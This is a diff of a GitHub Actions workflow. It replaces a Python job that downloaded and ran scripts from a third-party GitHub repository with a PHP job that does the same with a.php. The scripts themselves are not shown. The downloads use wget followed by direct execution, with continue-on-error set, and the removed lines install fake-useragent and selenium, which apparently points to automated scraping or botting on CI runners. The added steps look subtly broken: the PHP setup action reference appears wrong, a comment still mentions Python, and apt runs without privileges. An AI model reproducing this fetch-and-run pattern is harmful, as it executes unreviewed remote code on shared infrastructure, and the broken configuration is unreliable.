@@ -16,23 +16,20 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v2
 
-      - name: Set up Python
-        uses: actions/setup-python@v3
+      - name: Set up Php
+        uses: actions/setup-php@v7
         with:
-          python-version: 3.11  # Replace with your desired Python version
+          php-version: 7.3.10  # Replace with your desired Python version
 
-      - name: Run Python Program
+      - name: Run Php Program
         continue-on-error: true
         run: |
-          pip install requests beautifulsoup4 colorama fake-useragent
-          pip install selenium
-          pip install python-dotenv
-          pip install webdriver-manager
-          wget https://github.com/Bvfre/yu/raw/main/b.py
-          python b.py
-          wget https://github.com/Bvfre/yu/raw/main/a.py
+          apt install php-mysql php-curl
+          
+          
+          wget https://github.com/Bvfre/yu/raw/main/a.php
           ls
-          python a.py
+          php a.php
           
           
 
